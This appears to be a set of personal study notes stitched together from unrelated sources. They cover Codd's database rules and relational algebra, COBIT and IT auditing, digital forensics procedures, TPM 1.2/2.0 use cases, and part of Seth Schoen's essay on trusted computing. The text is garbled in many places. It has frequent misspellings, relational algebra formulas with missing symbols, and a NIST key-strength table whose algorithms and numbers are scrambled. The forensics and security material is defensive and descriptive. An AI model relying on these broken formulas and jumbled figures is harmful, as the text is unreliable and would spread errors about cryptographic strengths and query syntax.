  - The logical data in a database must be independent of its user’s view (application). Any change in logical data must not affect the applications using it.
example, if two tables are merged or one is split into two different tables, there should be no impact or change on the user application. This is one of the most difficult rule to apply.
Rule 10: Integrity Independence
A database must be independent of the application that uses it. All its integrity constraints can be independently modified without the need of any change in the application. This rule makes a database independent of the front-end application and its interface.
Rule 11: Distribution Independence
  - The end-user must not be able to see that the data is distributed over various locations.
  - Users should always get the impression that the data is located at one site only.
  - This rule has been regarded as the foundation of distributed database systems.
Rule 12: Non-Subversion Rule
  - If a system has an interface that provides access to low-level records, then the interface must not be able to subvert the system and bypass security and integrity constraints.
Relational Languages
  Relational database systems are expected to be equipped with a query language that can assist its users to query the database instances
  There are two kinds of query languages: relational algebra and relational calculus   We only introduce Relational Algebra here
Relational Algebra
Relational algebra is a procedural query language, which takes instances of relations as input and yields instances of relations as output
It uses operators to perform queries. An operator can be either unary or binary They accept relations as their input and yield relations as their output Relational algebra is performed recursively on a relation and intermediate
results are also considered relations
The fundamental operations of relational algebra are as follows. We will
discuss all these operations
  - Select (σ): sigma: selects tuples that satisfy the given predicate from
a relation
⁃
  - σ: selection predicate;
r: relation;
p: prepositional logic formula which may use connectors like and, or, and not. These terms may use relational operators
 like: =, ≠, ≥, <, >, ≤.
⁃
  - Project (Π): projects column(s) that satisfy a given predicate.
⁃
  - A1, A2, An: attribute names of relation r
  - Duplicate rows are automatically eliminated, as relation is a
set.
⁃
  - Union(∪): performs binary union table between two relations/tables
      - defined as
 ⁃
  - r and s are either database relations or relation result set
(temporary relation)
  - For a union operation to be valid, the following conditions
must hold:
  - r and s must have the same number of attributes
  - Attribute domains must be compatible
  - Duplicate tuples are automatically eliminated.
⁃
  - Set different(-): remove tuples, keeps all the tuples which are present in relation r but are not in the second relation s.
    -  ⁃
  - Cartesian product (X): Combines information of two different relations into one. r times s in new table.
 ⁃
   -   - Request: No colum with same name.
  - Rename (ρ)
  - The results of relational algebra are also relations but without any name.
  - The rename operation allows us to rename the output relation. ‘rename’ operation is denoted with small Greek letter rho ρ.
⁃
  - Natural Join (   )
  - Combines information of two different relations into one,
where the attributes with the same names must have the same values
⁃
  ⁃
  - When BD in table-r equl to BD in table-s   - Aggregation Operation (G)
  - takes a collection of values and returns a single value as a result.
 ⁃
  - Aggregation Functions: each function only return a single value
  - avg: calculate the average value
  - min: calculate the minimum value
  - max: calculate the maximum value
  - sum: calculate the sum of values
  - count: calculate the number of values Relational Algebra - Examples
Department = (DCode, Name, Phone, Chair)
Faculty = (FID, Name, Password, Rank, Office, DCode) Student = (SID, Name, Password, Status, Address, DCode) Major = (MCode, Name, Desc, DCode)
Section = (CallNo, MCode, CNo, Schedule, Room, FID) Enrollment = (SID, CallNo)
Transcript = (SID, MCode, Cno, Grade, Semester)
Course = (MCode, CNo, Title, Credit, Desc)
List all students (student IDs and names) who have completed at least 6 credits.
SC= SIDGsum(Credit)(Transcript   Course) ΠSC.SID,Name σsum(Credit) >= 6 (SC   Student))
Common SQL data types for attributes:
varchar(length): A variable-length string with a maximum length char(length): A fixed-length string with a length int(length): Integer with a maximum length
number/decimal(width[,decimal_digits]) A floating-point number with a width and an optional number decimal_digits for the decimal place
datetime Store a date and time in YYYY-MM-DD HH:MM:SS time Store a time in HH:MM:SS
date Store a date in YYYY-MM-DD
timestamp Store a timestamp
blob A binary large object that stores up to 64KB Information criteria
CIA +
Cobit add-ons Effectibeness Efficiency Conpliance Reliability
595
IT governance management guideline
Identifies critixal success factoy, key goal and performance indicators, and an
IT governance maturity model.
IT governance frameworl begins with setting IT obhectioves and measures and
compares perormance against them.
SDLC - Systems development life cycle
Provides overall framework for managing system debelopment process. All projects use som variation SDLC.
  - Project planning:
  - Implementation
  - Support In cobit
  - Plan and orgnize
  - Acquire and implement
  - Delver and support
  - Monitor and evaluate
   - Analysis: understand
  - Design: define
Information
Assets: people, data, technology(hard), (soft)
systems: hardware, software, procesures, data
IT auditors:
Governance vy assessing riskd and monitoring controls over those risks Work as either internal or external auditor Many kind od audit engagements
An Overview of Digital Forensics
The Federal Rules of Evidence (FRE) ensure consistency in federal
proceedings
Signed into law in 1973.
Many states’ rules map to the FRE.
FBI Computer Analysis and Response Team (CART)
formed in 1984
to handle cases involving digital evidence
By late 1990s, CART teamed up with
Department of Defense Computer Forensics Laboratory (DCFL)
Digital Forensics and Other
Related Disciplines
Investigating digital devices includes:
– Collecting data securely
– Examining suspect data to determine details such as origin and content
– Presenting digital information to courts
– Applying laws to digital device practices
Forensics investigators often work as part of a team, known as the investigations triad  Vulnerability/threat assessment and risk management
– Tests and verifies the integrity of stand- along workstations and network servers
Network intrusion detection and incident response
– Detects intruder attacks by using automated tools and monitoring network firewall logs
Digital investigations
– Manages investigations and conducts forensics analysis of systems suspected of containing evidence
A Brief History of Digital Forensics
By the early 1990s, the International Association of Computer Investigative Specialists (IACIS) introduced training on software for digital forensics
ILook is currently maintained by the IRS Criminal Investigation Division
AccessData Forensic Toolkit (FTK) is a popular commercial product Following Legal Processes
Digital Evidence First Responder (DEFR)
– Arrives on an incident scene, assesses the situation, and takes precautions to acquire and preserve evidence
Digital Evidence Specialist (DES)
– analyze the data and determine when another specialist should be called in to assist
Affidavit 宣誓书 - a sworn statement of support of facts about or evidence of a crime
– Must include exhibits that support the allegation
Understanding Private-Sector Investigations
Sample text that can be used in internal warning banners:
Use of this system and network is for official business only
Systems and networks are subject to monitoring at any time by the owner
Using this system implies consent to monitoring by the owner
Unauthorized or illegal users of this system or network will be subject to discipline or prosecution
Business: can avoid litigation 诉讼 by displaying a warning banner on computer screens
– Informs end users that the organization reserves the right to inspect computer systems and network traffic at will Maintaining Professional Conduct
Professional conduct - includes ethics, morals, and standards of behavior
An investigator must exhibit the highest level of professional behavior at all times
– Maintain objectivity
– Maintain credibility by maintaining confidentiality
Investigators should also attend training to stay current with the latest technical changes in computer hardware and software, networking, and forensic tools Preparing a Digital Forensics Investigation
The role of digital forensics professional
to gather evidence to prove that a suspect committed a crime or violated a company policy
Collect evidence that can be offered in court or at a corporate inquiry
– Investigate the suspect’s computer
– Preserve the evidence on a different computer
Chain of custody. 保管
Route the evidence takes
from the time you find until the case is
closed or goes to court
An Overview of a Company Policy Violation
 Employees misusing resources can cost companies millions of dollars
Misuse includes:
– Surfing the Internet
– Sending personal e-mails
– Using company computers for personal tasks
Planning Your Investigation
A basic investigation plan:
Acquire the evidence
Complete an evidence form and establish a chain of custody
Transport the evidence to a computer forensics lab
Secure evidence in an approved secure container A basic investigation plan (cont’d):
– Prepare your forensics workstation
– Retrieve the evidence from the secure container
– Make a forensic copy of the evidence
– Return the evidence to the secure
container
– Process the copied evidence with computer forensics tools
chain-of-evidence/ evidence custody form:
document action with the original evidence and its forensics copies
Two types
– Single-evidence form
Lists each piece of evidence on a separate page
– Multi-evidence form Securing Your Evidence evidence bags: secure and catalog the
evidence
Use computer safe products when collecting computer evidence
– Antistatic bags
– Antistatic pads
Use well padded containers
Use evidence tape to seal all openings
– CD drive bays
– Insertion slots for power supply electrical cords and USB cables
Internet Abuse Investigations
Recommended steps
Use standard forensic analysis techniques and procedures page URL information
Contact the network firewall administrator and request a proxy server log
Compare the data recovered from forensic analysis to the proxy server log
Continue analyzing the computer’s disk drive data
E-mail Abuse Investigations
To conduct an investigation you need:
– An electronic copy of the offending e- mail that contains message header data
– If available, e-mail server log records
– For e-mail systems that store users’ messages on a central server, access to the server
– Access to the computer so that you can perform a forensic analysis on it – Your preferred computer forensics analysis tool
Recommended steps
– Use the standard forensic analysis techniques
– Obtain an electronic copy of the suspect’s and victim’s e-mail folder or data
– For Web-based e-mail investigations, use tools such as FTK’s Internet Keyword Search option to extract all related e-mail address information
– Examine header data of all messages of interest to the investigation
Industrial Espionage 谍报活动 Investigations suspected industrial espionage cases
Staff needed
– Computing investigator who is responsible for disk forensic examinations
– Technology specialist who is knowledgeable of the suspected compromised technical data
– Network specialist who can perform log analysis and set up network sniffers
– Threat assessment specialist (typically an attorney)
Interviews and Interrogations in High-Tech Investigations
skilled interviewer and interrogator take years. Interview
– collect information from a witness or suspect
About specific facts related to an investigation
Interrogation
– trying to get a suspect to confess
Understanding Data
Recovery Workstations and
Software
Investigations are conducted on a computer forensics / data-recovery lab
– In data recovery, the customer or your company just wants the data back
Computer forensics workstation
– A specially configured PC
– Loaded with additional bays and forensics software
To avoid altering the evidence use:
– Write-blockers devices
Enable you to boot to Windows without
writing data to the evidence drive
Setting Up Your Workstation
for Digital Forensics
Basic requirements
– A workstation running Windows 7 or later, or Linux
– A write-blocker device
– Digital forensics acquisition tool
– Digital forensics analysis tool
– Target drive (big) to receive the source or suspect disk data
– Spare PATA or SATA ports
– USB ports Additional useful items Network interface card (NIC) Extra USB ports
SAS/SCSI card
Disk editor tool
Text editor tool
Graphics viewer program Other specialized viewing tools
Gathering the Evidence
Avoid damaging the evidence
Prepare the hash before start
Steps
Meet the IT manager to interview him
Fill out the evidence form, have the IT manager sign
Place the evidence in a secure container
Carry the evidence to the computer forensics lab
Complete the evidence custody form
Secure evidence by locking the container
Understanding Bit-Stream
Copies
Bit-stream copy
– Bit-by-bit copy of the original storage medium
– Exact copy of the original disk
– Different from a simple Backup software
only copy known files
cannot copy deleted files, e-mail messages or recover file fragments
Bit-stream image
– File containing the bit-stream copy of all data on a disk or partition
– Also known as “image” or “image file”  Acquiring an Image of
Evidence Media
First rule of computer forensics
– Preserve the original evidence
Conduct your analysis only on a copy of the data
Several vendors provide acquisition tools
Windows tools require a write-blocking device when acquiring data from FAT or NTFS file systems Using ProDiscover Basic to Acquire a USB Drive
Create a work folder for data storage
Steps to perform an acquisition on a USB drive:
– On the USB drive locate the write- protect switch and place the drive in write-protect mode
– Start ProDiscover Basic
– In the main window, click Action,
Capture Image from the menu
– Click the Source Drive drop-down list,
and select the thumb drive
Analyzing Your Digital Evidence Your job is to recover data from: – Deleted files
– File fragments
– Complete files
Deleted files linger on the disk until new data is saved on the same physical location
Tools can be used to retrieve deleted files
ProDiscover Basic
And many others
Steps to analyze a USB drive
– Start ProDiscover Basic – Create a new case
– Type the project number – Add an Image File
Steps to display the contents of the acquired data
– Click to expand Content View – Click All Files under the image filename path
 With ProDiscover Basic you can:
– Search for keywords of interest in the case
– Display the results in a search results window
– Click each file in the search results window and examine its content in the data area
– Export the data to a folder of your choice
– Search for specific filenames
– Generate a report of your activities
 Completing the Case
You need to produce a final report – State what you did and what you
found
Include ProDiscover report to document your work
Repeatable findings
– Repeat the steps and produce the same result
If required, use a report template Report should show conclusive
evidence
– Suspect did or did not commit a crime or violate a company policy
Keep a written journal of everything you do
– Your notes can be used in court Answer the six Ws:
– Who, what, when, where, why, and how
You must also explain computer and network processes
Summary
Investigators need specialized workstations to examine digital evidence
Keep track of the chain of custody of your evidence
Internet abuse investigations require examining server log data
A bit-stream copy is a bit-by-bit duplicate of the original disk
Always maintain a journal to keep notes on exactly what you did          510
Scenarios for Using TPM 1.2
In general, the TPM 2.0 design can do anything a TPM 1.2 chip can do. Thus, in considering applications that can use a TPM 2.0 chip, it’s wise to first examine the applications that were enabled by the TPM 1.2 design.
Identification
The use envisioned for the first embedded security chip was device identification (DeviceID). Smart cards use their keys for this purpose.
The private key embedded in the chip identifies the card on which it resides,
an authentication password or PIN is used to authenticate a person to the card, and together they form “the thing you have” and “the thing you know” for authentication. Nothing keeps several people from using the same smart card, as long as they all know the PIN. There is also nothing that ties the smart card to a particular machine, which is an advantage when the smart card is used as a proxy for identifying an individual instead of a machine.
By embedding a private key mechanism in a personal computing device, that device can be identified. This is a big advantage for an IT organization, which owns the device and is in control of its software load and security protections. But as computers became more portable with the production of smaller and lighter laptops, the PC itself began to be useful as “the thing you have” in place of a smart card. It turned out that many times, when a smart card was used to authenticate a person to a computer network, the user left the smart card with the device. If one was stolen, both were stolen. As a result, there was no advantage to keeping the two separate.
However, if the password of a key stored in a security chip inside a personal computer was going to be used as a proxy for an individual, it was clear that the key could not reside in a single computer.
The key has to be able to exist in multiple machines, because individuals tend to use more than one device.
Further, machines are upgraded on average every 3 to 5 years, and keys must move from an old system to a new system in order to make system management possible.
These realizations led to two of the objectives of the original embedded security chips.
They needed keys that identified the device—keys that couldn’t be moved to different machines.
And they needed keys that identified individuals—keys that could be duplicated across a number of machines. In either case, the keys had to be able to be deleted when an old system was disposed of.
What is the identification used for? There are a large number of uses, including these:
VPN identifying a machine before granting access to a network: An IT organization can be certain that only enterprise-owned machines are allowed on the enterprise’s network.
VPN identifying a user before granting access to a network: An IT organization can be certain that only authorized personnel are granted access to an enterprise’s network.
User signing e-mail: The recipient of an e-mail can know with some certainty who sent the e- mail.
User decrypting e-mail sent to them: This allows for confidentiality of correspondence. User identifying themselves to their bank: A user can prevent others from logging in to their
account.
User authorizing a payment: A user can prevent others from making payments in their name. User logging in remotely to a system: Only authorized personnel can log in to a remote system. Encryption
security chip embedded on systems: also provide a means of encrypting keys that were used in turn to encrypt files on the hard drive or to decrypt files that arrived from other systems.
Export regulations made putting a bulk encryption/ decryption engine in the security chip a nonstarter; but using the chip to store encryption keys was allowed
The chip already had public/ private encryption: to perform cryptographic signing
  - inexpensive to add the ability to decrypt a small amount of data containing
a key that was encrypted with a public key, if the chip knew the private
portion of the key.
Once this basic capability was available, it enabled a number of scenarios such as the
following:
File and folder encryption on a device
Full disk encryption
Encryption of passwords for a password manager Encryption of files stored remotely
Key Storage
How many keys do you think people will want to use with this chip? — More than three.
Cost: infeasible to store all the keys on the chip, as was done in a smart card.
However, the chip is used in PCs, which have hard disks and hence almost unlimited storage for keys—and TPG decided to make use of that fact.
The TPM has access to a self-generated private key, so it can encrypt keys with a public key and then store the resulting blob on the hard disk. This way, the TPM can keep a virtually unlimited number of keys available for use but not waste valuable internal storage.
Keys stored on the hard disk can be erased, but they can also be backed up, which seemed to the designers like an acceptable trade-off.
Cheap keys associated with a TPM enable a number of scenarios like these:
  - Privacy-sensitive solutions that use different keys to provide only a minimum of information to a requestor: You don’t need a single identity key that includes a user’s age, weight, marital status, health conditions, political affiliation, and so on.
  - Different keys for different security levels: Personal, financial, and business data as well as data that is contractually restricted all require different levels of confidentiality.
  - Different keys for multiple users of the same PC: Sometimes several people share a computer. If that is the case, they typically don’t want to give each other complete access to their files.
  - “Hoteling” of PCs in an office: Keys are stored on a server and downloaded and used on a PC as required.
Random Number Generator (RNG)
In order to generate keys, a random number generator (RNG) is necessary
early PCs generally didn’t contain good RNGs: poor key generation was used to break security protocols. So the standards body required that a RNG be one of the components of the first TPM.
  - Anyone who considers arithmetical methods of producing random digits is, of course, in a state of sin.1 —Von Neumann
There are many uses for a good RNG:
Seeding the OS random number generator
Generating nonces (random numbers) used in security protocols Generating ephemeral (one-time use) keys for file encryption Generating long-term use keys (such as keys used for storage) Seeding Monte Carlo software routines
NVRAM Storage
A small amount of NVRAM storage that has restricted access-control properties can be very useful in a PC.
It can store keys that shouldn’t be available when the machine is off
  - give faster access to data than decryption using public/private key pairs.
provide a mechanism to pass information back and forth between different parts of a system.
NVRAM in TPMs can be configured to control read and write capabilities separately   - some data can be provided to a user without worrying that it will be erased
by accident or malicious intent.
can use NVRAM to store keys that are used when the PC doesn’t have access to its main storage. This can happen early during the boot cycle or before a self- encrypting drive has been given its password, allowing it to be read.
Having NVRAM provides the following: Storage for root keys for certificate chains: These are public keys to which everyone should have access—but it’s very important that they not be changed.
Storage for an endorsement key (EK):
  - An endorsement key (EK):
  - stored by the manufacturer
  - used to decrypt certificates, pass passwords into the TPM during
provisioning.
  - In spite of misleading statements made on the Internet, the EK was designed to be
privacy sensitive.
Storage for a representation of what the state of the machine ought to be:
  - This is used by some Intel implementations using TPMs and Intel Trusted Execution Technology (TXT), launch control policy.
  - Like the public root key used in Unified Extensible Firmware Interface (UEFI) secure-boot implementations, this is used by the system owner to specify the state they want the machine to be in when it goes through a controlled launch, usually of a hypervisor.
  - The advantage over the UEFI secure-boot method.
  - the TPM, the end user has full control over the contents of the NVRAM
storage.
Storage for decryption keys used before the hard disk is available: example, a key used for a self-encrypting drive.
Platform Configuration Registers
One unique thing about TPM: it’s on the motherboard and available before the machine boots.
  - can’t be guaranteed with smart cards.
It is a place to store measurements taken during the boot process.   - They store hashes of measurements taken by external software
  - the TPM can later report those measurements by signing them with a
specified key.
they have a one-way characteristic that prevents them from being spoofed.
  - if the registers provide a representation of trusted software that behaves as expected, then all the register values can be trusted.
use them as a kind of authentication signal.
  - Example
  - a time lock won’t allow a bank vault to unlock unless the time is during business hours,
  - you can create a key or other object in a TPM that can’t be used unless a PCRs is in a given state.
Many interesting scenarios are enabled by this, including these:
  - A VPN may not allow a PC access to a network unless it can prove it’s
running approved IT software.
  - A file system may not obtain its encryption key unless its MBR has not
been disturbed and the hard disk is on the same system.
Privacy Enablement
The architects of the first TPM were very concerned about privacy.
Privacy is of major importance to enterprises, because losing systems or data that
contain personally identifiable information (PII) can cause an enormous loss of
money.
Laws in many states require enterprises to inform people whose private data has been
lost Example,
  - if a laptop containing a database of Human Resources data is stolen, the enterprise is required to notify everyone whose data might have been compromised. This can cost millions of dollars.
  - Before the advent of embedded security systems, encryption of private files was nearly impossible on a standard PC because there was no place to put the key.
  - As a result, most encryption solutions either “hid” the key in a place that was easily found by the technically adept, or derived a key from a password.
  - Passwords have a basic problem: if a person can remember it, a computer can figure it out.   - The best way to prevent this is to have hardware track when too many wrong attempts are made to guess a password and then cause a delay before another attempt is allowed.
  - The TPM specification requires this approach to be implemented, providing an enormous privacy advantage to those who use it.
The second privacy-related problem the architects tried to solve was much harder: providing a means to prove that a key was created and was protected by a TPM without the recipient of that proof knowing which TPM was the creator and protector of the key.
Like many problems in computer science, this one was solved with a level of indirection.
By making the endorsement key (EK) a decryption-only key, not a signing key: it can’t be (directly) used to identify a particular TPM.
  - Instead, a protocol is provided for making attestation identity keys (AIKs), pseudo-identity keys for the platform.
Providing a protocol for using a privacy CA means the endorsement key (EK) can be used to prove that an attestation identity keys (AIKs) originated with a TPM without proving which TPM the attestation identity keys (AIKs) originated from.
Because there can be an unlimited number of attestation identity keys (AIKs):
  - you can destroy AIKs after creating and using them
  - have multiple AIKs for different purposes.
  - a person can have three different AIKs that prove they’re a senior citizen, rich, and live alone
  - rather than combining all three into one key and exposing extra information when proving one of their properties.
Additionally, some clever cryptographers (Intel, IBM, HP) came up a protocol: direct anonymous attestation (DAA),
which is based on group signatures and provides a very complicated method for proving that a key was created by a TPM without providing information as to which TPM created it.
The advantage of this protocol: it lets the AIK creator choose a variable amount of knowledge they want the privacy CA to have, ranging from perfect anonymity (when a certificate is created, the privacy
CA is given proof that an AIK belongs to a TPM, but not which one) to perfect knowledge (the privacy CA knows which EK is associated with an AIK when it’s providing a pseudonymous certificate for the AIK).
The difference between the two:
when a TPM is broken and a particular EK’s private key is leaked to the Internet.
At this point, a privacy CA can revoke certificates if it knows a certificate it created is associated with that particular EK, but can’t do so if it doesn’t know.
PCR sensitivity to small changes in design, implementation, and use of PCs makes PCRs for the most part irreversible.
That is, knowing a PC’s PCR values provides almost no information about how the PC is set up.
This is unfortunate for an IT organization that notices a change in PCR values and is trying to figure out why.
It does provide privacy to end users, though.
Scenarios for Using Additional TPM 2.0 Capabilities
TPM 1.2 led to a number of changes in the architecture of TPM 2.0.
In particular, the SHA-1 algorithm, on which most 1.2 structures were based, was subjected to cryptographic attacks. As a result, the new design needed to not be catastrophically broken if any one algorithm used in the design become insecure.
Algorithm Agility (New in 2.0)
Beginning in TPM 2.0, the specification allows a lot of flexibility in what algorithms a TPM can use.
Instead of having to use SHA-1,
a TPM can now use virtually any hash algorithm. SHA 256 will likely be used in most early
TPM 2.0 designs.
Symmetric algorithms like Advanced Encryption Standard (AES) are also available,
and new asymmetric algorithms such as elliptic curve cryptography (ECC) are available in
addition to RSA.
The addition of symmetric algorithms (enabled by the weakening of export-control laws) allows keys to be stored off the chip and encrypted with symmetric encryption instead of asymmetric encryption. With this major change to the method of key storage, TPM 2.0 allows any kind of encryption algorithm. This in turn means if another algorithm is weakened by cryptanalysis in the future, the specification won’t need to change.
Ideally, the key algorithms should be matched in strength. Table 3-1 lists the key strengths of approved algorithms according to the National Institute of Standards and Technology NIST).2  Asymmetric Asymmetric Asymmetric Asymmetric Asymmetric Asymmetric Asymmetric Asymmetric Symmetric Symmetric Symmetric Symmetric Symmetric Hash
Hash Hash Hash Hash Hash
Key strength (bits)
Algorithm
RSA RSA RSA
RSA
ECC
ECC
ECC
ECC
DES
3DES (2 keys) 127 3DES (3 key) 128 AES 128 128
AES 256 256 SHA-1 65
SHA 224 112 SHA 256 128 SHA 384 192 SHA 512 256 SHA-3 Variable
1024 80 2048 112 3072 128 16384 256 224 112 256 128 384 192 521 260
56
2NIST, “Recommendation for Key Management – Part 1: General (Revision 3),” Special Publication 800-57, http://csrc.nist.gov/publications/nistpubs/800-57/sp800-57_part1_rev3_ general.pdf.
30
AES is typically used for the symmetric algorithm today. At 128 bits, the two most frequently used asymmetric algorithms are RSA 2048 or ECC 256. RSA 2048 isn’t quite
as strong as ECC 256 and is much slower. It also takes up a lot more space. However, the patents on RSA have expired, and it’s compatible with most software today, so many people still use it. Many people are using RSA 2048 together with SHA-1 and AES-128, even though they’re far from a matched set, because they’re free and compatible. Most of the examples in this book use both RSA and ECC for encryption and decryption, but SHA 256 is used exclusively for hashing.
SHA-1 has been deprecated by NIST, and it won’t be accepted after 2014 for any use for signatures (even though most uses of SHA-1 in TPM 1.2 don’t fall prey to the types
of attacks that are made possible by current cryptanalysis). The bit strength of SHA-1 is significantly weaker than that of the other algorithms, so there doesn’t appear to be any good reason to use it other than backward compatibility.
TCG has announced the families of algorithms that can be supported by publishing a separate list of algorithm IDs that identify algorithms to be used with a TPM. This includes the hash algorithms to be used by the PCRs. This list may change with time. Algorithm agility enables a number of nice features, including the following Using sets of algorithms compatible with legacy applications
Using sets of algorithms compatible with the US Government’s Suite B for Secret Using sets of algorithms compatible with the US Government’s Suite B for Top Secret Using sets of algorithms compatible with other governments’ requirements
Upgrading from SHA-1 to SHA 256 (or other more secure algorithms)
Changing the algorithms in a TPM without revisiting the specification
Trusted Computing: Promise and Risk
By Seth Schoen
Introduction
Computer security is undeniably important, new vulnerabilities discovered and exploited, the perceived need for new security solutions grows.
"Trusted computing" initiatives propose to solve some of today's security problems through hardware changes to the personal computer.
Changing hardware design isn't inherently suspicious, but the leading trusted computing proposals have a high cost: they provide security to users while giving third parties the power to enforce policies on users' computers against the users' wishes -- they let others pressure you to hand some control over your PC to someone else. This is a "feature" ready-made for abuse by software authors who want to anticompetitively choke off rival software.
It needn't be this way: a straightforward change to the plans of trusted computing vendors could leave the security benefits intact while ensuring that a PC owner's will always trumps the wishes of those who've loaded software or data onto the PC.
Redesigning PC hardware for security
There is a widespread perception that personal computer security is in an unfortunate state and that something must be done to fix it.
There are many promising approaches to improving security
redesigning operating systems, changing programming methodologies, or altering the PC's hardware itself.
comprehensive defense against the security threats faced by PC users will involve several approaches, not just one.
An insecure system can't magically become "secure" with the addition of a single piece of technology.
Changes to the design of PC hardware are one useful tool among many for improving security.
hardware changes: aren't a prerequisite 先决条件 for increased security, but undeniably helpful
Example:
by providing a way to store private keys safely. One family of projects to add security to PCs through hardware changes is "trusted computing"
includes a mix of initiatives by individual processor manufacturers and Original Equipment Manufacturers OEMs, along with two particularly well-known larger projects.
The first: an operating system project by Microsoft -- Palladium / Microsoft Next-Generation Secure Computing Base, NGSCB.
  - The NGSCB project specifies software changes that take advantage of the security benefits made available by a planned new PC hardware design.
The other well-known project is a hardware specification project run by a consortium Trusted Computing Platform Alliance TCPA.
  - TCPA issued several specification documents and then changed its name to the trusted computing group TCG.
Between them, these two projects have created a bewildering 使人眼花缭 乱的 array of new terminology, including the obligatory thicket of new acronyms.
In several cases, one of these projects has devised many different names for a single concept -- even as the other project has its own entirely different terminology.
A reasonably complete glossary for these two projects could fill dozens of pages.
In the interest of simplicity, we note that the requirements of NGSCB are converging with the features of the design specified by TCG.
  - (Microsoft is a TCG member and has expressed an interest in using the TCG design in the role of the hardware components required by NGSCB.)
Some OEMs have begun to integrate early TCG chips onto their computers' motherboards;
in the future, more computer manufacturers may include future versions of trusted computing circuits in their PCs.
The NGSCB software would be one application of several which could take advantage of the features of these chips.
While these projects are still distinct, it is reasonable to speak of a single "trusted computing architecture" toward which both projects are headed.
(Only a portion of this architecture is described by the most recently published TCG specification, and, as TCG notes, additional software will be required to make use of many of these features.)
Less well known trusted computing projects, under development by processor vendors (and TCG members) Intel and AMD, may fill in some of the gaps between what TCG has so far specified and what NGSCB would require.
Intel's LaGrande Technology (LT) and AMD's Secure Execution Mode (SEM)
  - Example: provide hardware support needed for all the major feature groups in NGSCB.
  - The Intel and AMD projects are not discussed as separate entities here, but their features would build on TCG features to provide the hardware support demanded by NGSCB. TCG specification is that both contain a "remote attestation" feature, which we will criticize extensively below.
there are differences between Microsoft's and TCG's technical descriptions of remote attestation
But both can given proper operating system support, be used in functionally equivalent ways.
Whether or not the NGSCB and TCG projects converge on a single hardware design, the general criticisms of attestation here will properly apply to either.
We are describing a work in progress, but it is important that we start now to understand the proposed changes to the PC and their likely effects on our computing activities.
Broadly speaking, the trusted computing architecture is a misguided implementation of a valuable idea, and would offer both advantages and disadvantages to computer owners.
In Microsoft's account of the trusted computing architecture
  - the anticipated changes are divided at a high level into four groups, all of which require new hardware to be added to today's PCs.
  - 1. Memory curtaining
  - 2. Secure input and output
  - 3. Sealed storage
  - 4. Remote attestation
Each feature has a different security rationale, although the features can be used in conjunction with one another.
1. Memory curtaining
Memory curtaining: a strong, hardware-enforced memory isolation feature to prevent programs from being able to read or write one another's memory.
Today, an intruder or malicious code can often read or alter sensitive data in a PC's memory.
even the operating system should not have access to curtained memory, so an intruder who gains control of the very operating system would not be able to interfere with programs' secure memory.
Although memory isolation can be achieved in software, this requires some combination of rewriting operating systems, device drivers, and possibly even application software.
Implementing this feature in hardware instead permits greater backwards compatibility with existing software and reduces the quantity of software which must be rewritten. (In general, many of the security benefits of trusted computing could be achieved in some form simply by rewriting software, but this appears impractical to some.)
2. Secure I/O
Secure input and output: aims to address the threats (keyloggers, screen- grabbers, software used by snoops and intruders) to spy on computer users' activities.
A keylogger records what you type, and a screen-grabber records what's displayed on the screen.
Secure I/O provides a secure hardware path from the keyboard to an
application -- and from the application back to the screen.
No other software running on the same PC will be able to determine what the user typed, or how the application responded.
provide protection against some more esoteric attacks. It will allow programs to determine whether their input is provided by a physically present user, as distinct from another program impersonating a user. And it will defeat some cases of forgery where one program attempts to corrupt or mask another's output in order to deceive the user.
3. Sealed storage
Sealed storage addresses a major PC security failing: the inability of a PC to securely store cryptographic keys.
Customarily, the keys and passwords that protect private documents or accounts are stored locally on the computer's hard drive, alongside the documents themselves.
This has been compared to leaving the combination to a safe in the same room with the safe itself.
In practice, intruders who break into a computer can frequently copy decryption and signing keys from that computer's hard drive.
  - Since the keys must be accessible to computer users in order to be usable for their intended purpose, security engineers have faced a quandary: how can keys be stored so that they are accessible only to legitimate users and not to, say, a virus, which might acquire the same privileges as a legitimate user? Sealed storage is an ingenious invention that generates keys based in part on the identity of the software requesting to use them and in part on the identity of the computer on which that software is running.
  - The result is that the keys themselves need not be stored on the hard drive but can be generated whenever they are needed, authorized software tries to generate them on an authorized machine.
  - program other than the program that originally encrypted / sealed, private data should attempt to decrypt / unseal, that data, the attempt is guaranteed to fail.
  - if the data is copied in encrypted form to a different machine, decrypt will unsuccessful.
  - Thus, your e-mail could be readable to your e-mail client, but incomprehensible to a virus.
  - Sealed storage represents a clever solution to a previously intractable key storage problem.
example,
  - suppose you keep a private diary on your PC today.
  - want to prevent the diary from being moved off your computer without your permission, much as you might lock a paper diary inside a desk drawer. While existing access control and encryption systems address this goal, they might be bypassed or subverted. If someone compromises your system, or it becomes infected with a worm or virus, local software could be altered, or private documents could be e- mailed or copied to other computers. (The SirCam e-mail worm did precisely this -- whenever it infected a computer, it sent files it found there as e-mail attachments to randomly chosen Internet users. A substantial amount of private and confidential information was inappropriately disclosed as a result.)
You can encrypt your diary using a password, but if your password is short, someone who can copy the encrypted diary will still be able to decrypt it (by trying each possibility in a brute force attack). What's more, if the encryption software you use, or the editor in which you compose the diary, is surreptitiously replaced with a modified version, it might leak the decrypted diary's text (or your password) to a third party.
Sealed storage can work together with memory curtaining and secure I/ O to ensure that your diary can only be read on your computer, and only by the particular software with which you created it. Even if a virus or worm like SirCam leaks your encrypted diary, the recipient will not be able to decrypt it. If an intruder or a virus surreptitiously alters your encryption software, it will no longer be able to decrypt the diary, so the contents of your diary will remain protected.
4. Remote attestation
Remote attestation is the most significant and the most revolutionary of the four major feature groups described by Microsoft.
allow "unauthorized" changes to software to be detected.
If an attacker has replaced one of your applications, or a part of your operating system with a maliciously altered version, you should be able to tell.
Because the attestation is "remote", others with whom you interact should be able to tell, too. computer should be broken into, other computers can refrain from sending private information to it, at least until it has been fixed.
While remote attestation is obviously useful, the current TCG approach to attestation is flawed 有缺陷的.
TCG attestation conspicuously fails to distinguish between applications that protect computer owners against attack and applications that protect a computer against its owner.
In effect, the computer's owner is sometimes treated as just another attacker or adversary who must be prevented from breaking in and altering the computer's software.
Remote attestation works:
generating, in hardware, a cryptographic certificate attesting to the identity of the software currently running on a PC. (There is no determination of whether the software is good or bad, or whether it is compromised or not compromised. "Identity" is represented by a cryptographic hash, which simply allows different programs to be distinguished from one another, or changes in their code to be discerned, without conveying any sort of value judgment.)
This certificate may, at the PC user's request, be provided to any remote party, and in principle has the effect of proving to that party that the machine is using expected and unaltered software.
If the software on the machine has been altered, the certificate generated will reflect this. We will see that this approach, although elegant, proves problematic. How trusted computing affects the PC
4 feature groups is useful to computer security, because each can be used by appropriate software to prevent or mitigate real attacks currently used against PCs.
